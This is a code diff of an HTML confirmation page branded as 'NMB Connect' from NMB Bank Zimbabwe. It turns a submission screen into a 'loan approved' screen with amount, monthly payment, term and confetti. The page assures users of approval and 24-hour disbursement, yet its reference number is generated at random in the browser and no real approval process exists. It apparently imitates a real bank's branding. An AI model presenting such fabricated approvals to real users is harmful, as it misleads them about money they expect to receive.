@@ -3,77 +3,107 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NMB Connect - Application Success</title>
+    <title>NMB Connect - Application Approved</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap');
         * { font-family: 'Inter', sans-serif; }
-        body { background: linear-gradient(135deg, #004a99 0%, #003366 100%); min-height: 100vh; }
+        body { background: linear-gradient(135deg, #003d7a 0%, #002147 100%); min-height: 100vh; }
         .glass-effect { background: rgba(255, 255, 255, 0.98); backdrop-filter: blur(10px); }
         .fade-in { animation: fadeIn 0.5s ease-out forwards; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .pulse-check {
+            animation: pulseCheck 0.6s ease-out;
+        }
+        @keyframes pulseCheck {
+            0% { transform: scale(0.8); opacity: 0; }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); opacity: 1; }
+        }
     </style>
 </head>
 <body class="flex flex-col items-center justify-center min-h-screen p-4 py-10">
     <div class="w-full max-w-sm fade-in">
         <!-- Header -->
         <div class="text-center mb-6">
-            <div class="flex items-center justify-center gap-1 mb-2">
-                <span class="text-3xl font-black text-white tracking-tighter">NMB</span>
-                <span class="text-3xl font-black text-[#f2a900] tracking-tighter">Connect</span>
+            <div class="flex items-center justify-center gap-2 mb-2">
+                <div class="w-8 h-8 bg-white rounded-full flex items-center justify-center shadow-lg">
+                    <span class="text-sm font-black text-[#003d7a]">N</span>
+                </div>
+                <div>
+                    <div class="flex items-center gap-1">
+                        <span class="text-2xl font-black text-white tracking-tighter">NMB</span>
+                        <span class="text-2xl font-black text-[#fbbf24] tracking-tighter">Connect</span>
+                    </div>
+                </div>
             </div>
-            <p class="text-white/80 text-[10px] font-bold uppercase tracking-[0.3em]">Confirmation</p>
+            <p class="text-white/80 text-[9px] font-bold uppercase tracking-[0.2em]">Loan Application Complete</p>
         </div>
 
         <!-- Main Card -->
         <div class="glass-effect rounded-3xl shadow-2xl overflow-hidden">
             <!-- Title Section -->
-            <div class="bg-gradient-to-r from-[#003366] to-[#004a99] p-6 text-center">
-                <h1 class="text-white font-black text-xl mb-1 uppercase tracking-tight">Success!</h1>
-                <p class="text-white/70 text-[10px] font-bold uppercase tracking-widest">Application Submitted</p>
+            <div class="bg-gradient-to-r from-[#003d7a] to-[#005a99] p-6 text-center">
+                <h1 class="text-white font-black text-xl mb-1 uppercase tracking-tight">Congratulations!</h1>
+                <p class="text-white/70 text-[9px] font-bold uppercase tracking-widest">Your Loan Application Has Been Approved</p>
             </div>
 
             <!-- Content -->
             <div class="p-6 sm:p-8 space-y-6 text-center">
-                <div class="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mx-auto shadow-inner border border-green-100">
+                <div class="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mx-auto shadow-inner border border-green-100 pulse-check">
                     <i class="fas fa-check text-4xl text-green-500"></i>
                 </div>
 
                 <div class="space-y-1">
-                    <p class="text-[10px] font-black text-gray-400 uppercase tracking-widest">Reference Number</p>
-                    <p class="text-xl font-mono font-black text-[#003366]" id="refNum">NMB-XXXX-XXXX</p>
+                    <p class="text-[9px] font-black text-gray-400 uppercase tracking-widest">Reference Number</p>
+                    <p class="text-xl font-mono font-black text-[#003d7a]" id="refNum">NMB-XXXX-XXXX</p>
                 </div>
 
                 <div class="bg-gray-50 rounded-2xl p-5 space-y-3 border border-gray-100 text-left">
                     <div class="flex justify-between items-center">
-                        <span class="text-[10px] text-gray-500 font-bold uppercase tracking-wider">Amount</span>
-                        <span class="font-black text-base text-[#003366]" id="finalAmount">$500</span>
+                        <span class="text-[9px] text-gray-500 font-bold uppercase tracking-wider">Loan Amount</span>
+                        <span class="font-black text-base text-[#003d7a]" id="finalAmount">USD 500</span>
                     </div>
                     <div class="h-px bg-gray-200 w-full"></div>
                     <div class="flex justify-between items-center">
-                        <span class="text-[10px] text-gray-500 font-bold uppercase tracking-wider">Monthly Pay</span>
-                        <span class="font-black text-base text-[#003366]" id="finalMonthly">$43.49</span>
+                        <span class="text-[9px] text-gray-500 font-bold uppercase tracking-wider">Monthly Payment</span>
+                        <span class="font-black text-base text-[#003d7a]" id="finalMonthly">USD 43.49</span>
+                    </div>
+                    <div class="h-px bg-gray-200 w-full"></div>
+                    <div class="flex justify-between items-center">
+                        <span class="text-[9px] text-gray-500 font-bold uppercase tracking-wider">Loan Term</span>
+                        <span class="font-black text-base text-[#003d7a]" id="finalTerm">12 months</span>
                     </div>
                 </div>
 
-                <div class="bg-blue-50/50 border border-blue-100 rounded-2xl p-4">
-                    <p class="text-[10px] text-gray-600 font-bold leading-relaxed uppercase tracking-tight">
-                        <i class="fas fa-info-circle text-[#003366] mr-1"></i>
-                        Funds will be disbursed to your account within 24 hours.
+                <div class="bg-green-50/50 border border-green-100 rounded-2xl p-4 space-y-2">
+                    <p class="text-[9px] text-gray-600 font-bold leading-relaxed uppercase tracking-tight">
+                        <i class="fas fa-check-circle text-green-600 mr-2"></i>
+                        Your funds will be disbursed to your account within 24 hours.
+                    </p>
+                    <p class="text-[8px] text-gray-500 leading-relaxed">
+                        You will receive an SMS confirmation with your loan details and disbursement information.
                     </p>
                 </div>
 
-                <button onclick="backToHome()" class="w-full bg-gradient-to-r from-[#003366] to-[#004a99] text-white font-black py-4 rounded-2xl hover:shadow-xl active:scale-[0.98] transition-all uppercase text-sm tracking-[0.15em] shadow-lg">
-                    Return Home <i class="fas fa-home ml-2"></i>
+                <div class="bg-blue-50/50 border border-blue-100 rounded-2xl p-4">
+                    <p class="text-[9px] text-gray-600 font-bold leading-relaxed uppercase tracking-tight">
+                        <i class="fas fa-info-circle text-[#003d7a] mr-1"></i>
+                        Keep your reference number safe for future inquiries.
+                    </p>
+                </div>
+
+                <button onclick="backToHome()" class="w-full bg-gradient-to-r from-[#003d7a] to-[#005a99] text-white font-black py-4 rounded-2xl hover:shadow-xl active:scale-[0.98] transition-all uppercase text-sm tracking-[0.15em] shadow-lg">
+                    Return to Home <i class="fas fa-home ml-2"></i>
                 </button>
             </div>
         </div>
 
         <!-- Footer -->
-        <p class="text-center text-white/50 text-[10px] mt-8 font-bold uppercase tracking-widest">
-            © 2026 NMB Bank Zimbabwe | Application Complete
+        <p class="text-center text-white/50 text-[9px] mt-8 font-bold uppercase tracking-widest">
+            © 2026 NMB Bank Zimbabwe | Loan Application Complete
         </p>
     </div>
 
@@ -81,8 +111,9 @@
         const loanData = JSON.parse(localStorage.getItem('nmb_loan_data') || '{}');
         const session = JSON.parse(localStorage.getItem('nmb_session') || '{}');
         
-        document.getElementById('finalAmount').textContent = `$${parseFloat(loanData.amount || 0).toLocaleString()}`;
-        document.getElementById('finalMonthly').textContent = loanData.monthly || '$0.00';
+        document.getElementById('finalAmount').textContent = `USD ${parseFloat(loanData.amount || 0).toLocaleString()}`;
+        document.getElementById('finalMonthly').textContent = loanData.monthly || 'USD 0.00';
+        document.getElementById('finalTerm').textContent = `${loanData.term || 0} months`;
 
         const randomRef = 'NMB-' + Math.floor(1000 + Math.random() * 9000) + '-' + Math.random().toString(36).substring(2, 6).toUpperCase();
         document.getElementById('refNum').textContent = randomRef;
@@ -92,12 +123,15 @@
             window.location.href = 'index.html';
         }
 
-        confetti({
-            particleCount: 150,
-            spread: 70,
-            origin: { y: 0.6 },
-            colors: ['#003366', '#f2a900', '#22c55e']
-        });
+        // Confetti animation with NMB colors
+        setTimeout(() => {
+            confetti({
+                particleCount: 150,
+                spread: 70,
+                origin: { y: 0.6 },
+                colors: ['#003d7a', '#fbbf24', '#22c55e', '#005a99']
+            });
+        }, 500);
     </script>
 </body>
 </html>
